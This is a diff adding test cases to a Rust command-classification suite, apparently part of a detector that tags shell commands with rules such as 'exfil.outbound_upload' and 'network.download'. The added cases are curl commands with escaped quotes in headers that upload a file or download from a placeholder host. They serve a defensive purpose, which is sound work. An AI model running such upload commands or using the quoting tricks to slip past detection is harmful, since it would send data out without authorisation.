@@ -1044,6 +1044,27 @@ fn a_command_is_read_after_the_quoting_a_shell_removes() {
             "network.download",
             "C:\\t\\curl.exe https://example.invalid/a -o a",
         ),
+        // A quote's own escapes come off too, so an escaped quote ends no word.
+        (
+            "exfil.outbound_upload",
+            "curl -H \"X: a\\\"b\" -T n https://example.invalid/a",
+        ),
+        (
+            "exfil.outbound_upload",
+            "curl -H \"X: a\\\";b\" --data @n https://example.invalid/a",
+        ),
+        (
+            "exfil.outbound_upload",
+            "curl -H $'X: a\\';b' --data @n https://example.invalid/a",
+        ),
+        (
+            "network.download",
+            "curl -H \"X: a\\\"b\" https://example.invalid/a -o a",
+        ),
+        (
+            "network.download",
+            "curl -H $'X: a\\';b' https://example.invalid/a -o a",
+        ),
     ] {
         assert!(reader.rules(command).contains(rule), "{rule}: {command:?}");
     }
